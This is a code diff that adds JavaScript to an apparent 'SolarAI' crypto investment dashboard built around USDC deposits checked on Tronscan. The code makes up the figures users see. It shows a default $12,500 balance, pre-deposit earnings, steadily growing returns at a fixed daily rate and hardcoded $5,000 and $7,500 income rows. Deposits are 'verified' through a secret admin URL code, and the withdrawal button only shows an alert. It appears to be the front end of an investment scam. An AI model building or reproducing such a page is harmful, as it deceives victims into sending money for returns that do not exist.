+alert("Deposit pending admin verification on Tronscan");
+updateUI();
+}
+
+function calcEarn(){if(!isDeposited)return 845.75;let days=(Date.now()-depTime)/(86400000);return depAmount*DAILY*Math.max(0,days);}
+
+function updateUI(){
+let earn=calcEarn();
+let total=depAmount+earn;
+document.getElementById('balance').innerHTML=`$${total.toFixed(2)} <span style="font-size:11px;background:#2a5a8a;padding:3px 6px;border-radius:10px;">S5</span>`;
+document.getElementById('incomeVal').innerText=`$${earn.toFixed(2)}`;
+document.getElementById('userPhone').innerText=userPhone;
+document.getElementById('usdcBal').innerText=`${total.toFixed(0)} USDC`;
+document.getElementById('solarInc').innerText=`$${(earn*0.65).toFixed(2)}`;
+document.getElementById('biogasInc').innerText=`$${(earn*0.35).toFixed(2)}`;
+
+let rows=[
+`23 Apr 2026 | Expenditure | $250.00 | Completed`,
+`19 Apr 2026 | Income | $${(depAmount*DAILY).toFixed(2)} | Completed`,
+`15 Apr 2026 | Income | $5,000.00 | Confirmed`,
+`10 Apr 2026 | Income | $7,500.00 | Confirmed`,
+];
+let pending=localStorage.getItem('solarai_pending_amount');
+if(pending) rows.unshift(`${new Date().toLocaleDateString()} | Deposit $${pending} | $${pending} | Pending Admin`);
+let table=document.getElementById('txTable');
+table.innerHTML='<tr><th>Date</th><th>Type</th><th>Amount</th><th>Status</th></tr>';
+rows.forEach(r=>{
+let [d,t,a,s]=r.split(' | ');
+let cls=s.includes('Completed')?'completed':'confirmed';
+if(r.includes('Pending')) cls='confirmed';
+table.innerHTML+=`<tr><td>${d}</td><td>${t}</td><td>${a}</td><td><span class="status ${cls}">${s}</span></td></tr>`;
+});
+drawChart();
+}
+
+function drawChart(){
+let c=document.getElementById('growthChart');
+let ctx=c.getContext('2d');
+let w=c.width=400; let h=c.height=180;
+ctx.clearRect(0,0,w,h);
+ctx.strokeStyle='#1a1f2b';ctx.lineWidth=1;
+for(let i=0;i<5;i++){ctx.beginPath();ctx.moveTo(0,i*40);ctx.lineTo(w,i*40);ctx.stroke();}
+ctx.strokeStyle='#c89a2a';ctx.lineWidth=2;ctx.shadowColor='#ffd76b';ctx.shadowBlur=10;
+ctx.beginPath();
+let points=[10,25,22,35,32,55,48,65,60,75,90];
+points.forEach((p,i)=>{
+let x=(i/(points.length-1))*w;
+let y=h - (p/100)*h -10;
+if(i===0)ctx.moveTo(x,y);else ctx.lineTo(x,y);
+});
+ctx.stroke();
+ctx.shadowBlur=0;
+}
+
+function recordIncome(){alert("Income recorded from physical solar energy sale - Admin will verify on Tronscan");}
+function recordExp(){alert("Expenditure recorded - Withdrawal request sent");}
+function logout(){localStorage.clear();location.reload();}
+
+window.onload=()=>{
+let p=new URLSearchParams(location.search);
+if(p.get('unlock')===ADMIN_CODE){
+let amt=parseFloat(localStorage.getItem('solarai_pending_amount')||'50');
+localStorage.setItem('solarai_deposited','true');
+localStorage.setItem('solarai_deposited_amount',amt.toString());
+localStorage.setItem('solarai_deposit_time',Date.now().toString());
+localStorage.removeItem('solarai_pending_amount');
+alert(`Verified $${amt}`);location.href=location.pathname;
+}
+isDeposited=localStorage.getItem('solarai_deposited')==='true';
+depAmount=parseFloat(localStorage.getItem('solarai_deposited_amount')||"12500");
+depTime=parseFloat(localStorage.getItem('solarai_deposit_time')||Date.now());
+if(localStorage.getItem('solarai_phone'))userPhone=localStorage.getItem('solarai_phone');
+updateUI();
+setInterval(updateUI,5000);
+}
 </script>
 </body>
 </html>
